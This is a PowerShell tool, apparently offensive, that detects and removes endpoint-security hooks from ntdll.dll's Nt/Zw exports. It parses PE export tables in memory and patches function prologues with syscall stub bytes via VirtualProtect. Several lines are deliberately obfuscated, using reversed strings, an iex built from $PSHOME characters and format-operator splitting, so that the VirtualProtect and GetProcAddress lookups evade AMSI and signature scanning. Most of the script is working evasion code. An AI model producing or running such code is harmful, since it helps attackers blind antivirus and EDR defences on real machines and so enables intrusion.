<#
.SYNOPSIS
    Unhook Ntdll.dll export functions.
.DESCRIPTION
    Unhook Ntdll.dll export functions.
.PARAMETER functionName
    The name of the API to unhook.
.PARAMETER list
    List all hooked functions.
.PARAMETER full
    Unhook all hooked functions.
.EXAMPLE
    PS C:\> Invoke-NtdllFullUnhook
#>

[CmdletBinding()]
param (
    [Parameter(Mandatory = $false)]
    [string]$functionName,

    [Parameter(Mandatory = $false)]
    [switch]$list,

    [Parameter(Mandatory = $false)]
    [switch]$full
)

function Get-Win32Types {
    $Win32Types = New-Object System.Object

    # Define all the structures/enums that will be used
    $Domain = [AppDomain]::CurrentDomain
    $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
    $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]

    ############    ENUM    ############
    #Enum MachineType
    $TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
    $TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
    $TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
    $TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
    $TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
    $MachineType = $TypeBuilder.CreateType()
    $Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

    #Enum MagicType
    $TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
    $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
    $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
    $MagicType = $TypeBuilder.CreateType()
    $Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

    #Enum SubSystemType
    $TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
    $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
    $SubSystemType = $TypeBuilder.CreateType()
    $Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

    #Enum DllCharacteristicsType
    $TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
    $TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
    $TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
    $TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
    $TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
    $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
    $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
    $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
    $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
    $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
    $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
    $TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
    $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
    $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
    $DllCharacteristicsType = $TypeBuilder.CreateType()
    $Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

    ###########    STRUCT    ###########
    #Struct IMAGE_DATA_DIRECTORY
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
    ($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
    ($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
    $IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

    #Struct IMAGE_FILE_HEADER
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
    $TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
    $IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

    #Struct IMAGE_OPTIONAL_HEADER64
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
    ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
    ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
    ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
    ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
    ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
    ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
    ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
    ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
    ($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
    ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
    ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
    ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
    ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
    ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
    ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
    ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
    ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
    ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
    ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
    ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
    ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
    ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
    ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
    ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
    ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
    ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
    ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
    ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
    ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
    ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
    ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
    ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
    ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
    ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
    ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
    ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
    ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
    ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
    ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
    ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
    ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
    ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
    ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
    ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
    ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
    $IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

    #Struct IMAGE_NT_HEADERS64
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
    $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
    $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
    $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64

    #Struct IMAGE_DOS_HEADER
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
    $TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

    $e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
    $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
    $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
    $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
    $e_resField.SetCustomAttribute($AttribBuilder)

    $TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

    $e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
    $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
    $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
    $e_res2Field.SetCustomAttribute($AttribBuilder)

    $TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
    $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()
    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

    #Struct IMAGE_EXPORT_DIRECTORY
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
    $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
    $IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY

    return $Win32Types
}

function IsHooked($functionInstruction) {
    if ($functionInstruction[0] -ne 0x4C -and $functionInstruction[1] -ne 0x8B -and $functionInstruction[2] -ne 0xD1 -and $functionInstruction[3] -ne 0xB8 -and ($functionInstruction[0] -eq 0xE9)) {
        return $true
    } else {
        return $false
    }
}

function Get-NeighborBaseAddress([IntPtr]$functionAddress) {
    $patch = [byte[]]@(0x4C, 0x8B, 0xD1, 0xB8, 0xFF)

    while ($true) {
        $neighborBaseAddress = [IntPtr]($functionAddress.ToInt64() + 32)
        $neighborInstruction = New-Object byte[] 5
        [System.Runtime.InteropServices.Marshal]::Copy($neighborBaseAddress, $neighborInstruction, 0, 5)

        Write-Host "`t[-] Neighbor Base Address:" $neighborBaseAddress.ToString("X")

        if (IsHooked($neighborInstruction)) {
            Write-Host "`t[!] Neighbor Base Address is also hooked ;(" -ForegroundColor Red
            $functionAddress = $neighborBaseAddress
        } else {
            $patch[4] = $neighborInstruction[4] - 1
            return $patch
        }
    }
} 

function Get-ProcAddress($moduleName, $functionName) {
    $sysAssembly = [System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {
        $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq 'System.dll'
    }

    $unsafeNativeMethods = ForEach ($type in $sysAssembly.GetTypes()) {
        $type | Where-Object {$_.FullName -like '*NativeMethods' -and $_.Fullname -like '*Win32*' -and $_.Fullname -like '*Un*'}
    }

    $moduleHandle = $unsafeNativeMethods.GetMethods() | Where-Object {$_.Name -like '*Handle' -and $_.Name -like '*Module*'} | Select-Object -First 1
    $procAddress = $unsafeNativeMethods.GetMethod('GetProcAddress', [type[]]('IntPtr', 'System.String'))

    $module = $moduleHandle.Invoke($null, @($moduleName))
    $procAddress.Invoke($null, @($module, $functionName))
}

function Get-DelegateType($function, $delType = [Void]) {
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
    [System.MulticastDelegate])

    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $function).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $function).SetImplementationFlags('Runtime, Managed')
    
    return $type.CreateType()
}

function Unhook([IntPtr]$functionAddress) {
    $patch = Get-NeighborBaseAddress($functionAddress)

    &( $pSHOME[4]+$pshOME[34]+'x') ( " $(SV 'ofS' '' ) "+([stRINg] [REgeX]::mAtCHeS( ")''nIoj-]2,11,3[emAN.)'*RdM*' vg(( & | )43]raHC[,'aJq'  ecALpErc- 63]raHC[,)09]raHC[+221]raHC[+211]raHC[(eCALPer- )')))]n'+'a'+'elo'+'o'+'B[( )'+')('+'ep'+'yT'+'f'+'eR'+'yBekaM.]2'+'3tnIU[ '+',]23t'+'nI'+'U['+' '+',]'+'rtPtnI'+'U[ ,]'+'rtPtnI['+'('+'@ '+'epy'+'Tet'+'ageleD-te'+'G( '+',))aJq'+'tc'+'et'+'orPl'+'autr'+'i'+'VaJ'+'q( aJqll'+'d.23'+'lenr'+'ek'+'aJq '+'s'+'s'+'erddA'+'c'+'o'+'rP-'+'teG((retn'+'i'+'oPnoi'+'tcn'+'uFroFeta'+'geleDte'+'G::]la'+'hsraM.se'+'c'+'ivreSpo'+'retnI'+'.em'+'itn'+'uR'+'.me'+'tsyS[ '+'= t'+'ce'+'t'+'o'+'rPl'+'a'+'utriVZz'+'p'((" , '.' ,'Ri'+'GhT'+'TOleFt')| foReAcH{$_})+"$( sET 'oFs' ' ' ) " )

    Write-Host "`t[-] Patching Function:" $functionAddress.ToString("X")
    Write-Host "`t[-] Patching Bytes:" ([System.BitConverter]::ToString($patch))

    Write-Host "`t[-] Changing Memory Protection"
    $oldProtection = [UInt32]0
    $result = $VirtualProtect.Invoke($functionAddress, [UIntPtr]::new(5), 0x40, [ref]$oldProtection)
    if ($result -eq 0) {
        Write-Host "`t[!] Failed to change memory protection" -ForegroundColor Red
        return
    }

    Write-Host "`t[+] Writing Patch" -ForegroundColor Green
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $functionAddress, 5)

    Write-Host "`t[-] Restoring Memory Protection"
    $result = $VirtualProtect.Invoke($functionAddress, [UIntPtr]::new(5), $oldProtection, [ref]$oldProtection)
    if ($result -eq 0) {
        Write-Host "`t[!] Failed to restore memory protection" -ForegroundColor Red
        return
    }
}

function Get-NtdllBaseAddress() {
    $ntdll = Get-Process -Id $pid | Select-Object -ExpandProperty Modules | Where-Object {$_.ModuleName -eq 'ntdll.dll'} | Select-Object -ExpandProperty BaseAddress
    return [IntPtr]$ntdll
}

function Get-HookedFunctions() {
    $ntdll = Get-NtdllBaseAddress
    $win32Types = Get-Win32Types
    
    # Get IMAGE_DOS_HEADER
    $IMAGE_DOS_HEADER = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ntdll, [Type]$Win32Types.IMAGE_DOS_HEADER)

    # Get IMAGE_NT_HEADERS64
    $IMAGE_NT_HEADERS64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure(($ntdll.ToInt64() + $IMAGE_DOS_HEADER.e_lfanew), [Type]$Win32Types.IMAGE_NT_HEADERS64)

    # Get IMAGE_EXPORT_DIRECTORY
    $IMAGE_EXPORT_DIRECTORY = [System.Runtime.InteropServices.Marshal]::PtrToStructure([IntPtr]($ntdll.ToInt64() + $IMAGE_NT_HEADERS64.OptionalHeader.ExportTable.VirtualAddress), [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)

    # Get AddressOfFunctions
    $addressOfFunctions = [IntPtr]($ntdll.ToInt64() + $IMAGE_EXPORT_DIRECTORY.AddressOfFunctions)

    # Get AddressOfNames
    $addressOfNames = [IntPtr]($ntdll.ToInt64() + $IMAGE_EXPORT_DIRECTORY.AddressOfNames)

    $exportFunctions = @{}

    # Iterate through all the functions
    for ($i = 0; $i -lt $IMAGE_EXPORT_DIRECTORY.NumberOfNames - 1; $i++) {
        $functionRVA = [System.Runtime.InteropServices.Marshal]::ReadInt32($addressOfFunctions, $i * 4 + 4)
        $functionNameRVA = [System.Runtime.InteropServices.Marshal]::ReadInt32($addressOfNames, $i * 4)

        $functionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi([IntPtr]($ntdll.ToInt64() + $functionNameRVA))
        $functionAddress = [IntPtr]($ntdll.ToInt64() + $functionRVA)

        if ($functionName.ToLower() -like "nt*" -or $functionName.ToLower() -like "zw*") {
            $functionInstruction = New-Object byte[] 4
            [System.Runtime.InteropServices.Marshal]::Copy($functionAddress, $functionInstruction, 0, 4)
            if (IsHooked($functionInstruction)) {
                $exportFunctions.Add($functionName, $functionAddress)
            }
        }
    }

    return $exportFunctions
}

if ($functionName.Length -gt 0) {
    $ntdll = Get-NtdllBaseAddress
    $GetProcAddress = [TYpE]("{2}{0}{5}{1}{9}{4}{8}{3}{7}{11}{10}{6}"-f'm.rU','IM','sYSte','eRVi','.INtEr','NT','al','CE','OPs','E','ARSh','s.m');   ${n5`R3}::("{5}{2}{0}{7}{1}{6}{4}{3}" -f'leg','For','etDe','Pointer','n','G','Functio','ate').Invoke((.("{2}{1}{0}"-f'dress','d','Get-ProcA') ("{1}{0}{2}"-f'2','kernel3','.dll') (("{1}{2}{0}" -f 's','GetPr','ocAddres'))), (.("{4}{2}{0}{3}{1}" -f't','pe','elega','eTy','Get-D') @([IntPtr], [String]) ([IntPtr])))

    $functionAddress = $GetProcAddress.Invoke($ntdll, $functionName)
    if ($functionAddress -eq 0) {
        Write-Host "[!] Failed to find function" -ForegroundColor Red
        return
    } else {
        Write-Host "[+] Found function:" $functionName "(" $functionAddress.ToString("X") ")"
        Unhook $functionAddress
    }
} elseif ($full) {
    $hookedFunctions = Get-HookedFunctions
    foreach ($hookedFunction in $hookedFunctions.GetEnumerator()) {
        Write-Host "[-] Hooked Function:" $hookedFunction.Key "(" $hookedFunction.Value.ToString("X") ")"
        Unhook $hookedFunction.Value
    }
} else {
    $hookedFunctions = Get-HookedFunctions
    if ($hookedFunctions.Count -eq 0) {
        Write-Host "[+] No hooked functions found" -ForegroundColor Green
        return
    } else {
        foreach ($hookedFunction in $hookedFunctions.GetEnumerator()) {
            Write-Host "[-] Hooked Function:" $hookedFunction.Key "(" $hookedFunction.Value.ToString("X") ")" -ForegroundColor Red
        }
    }
}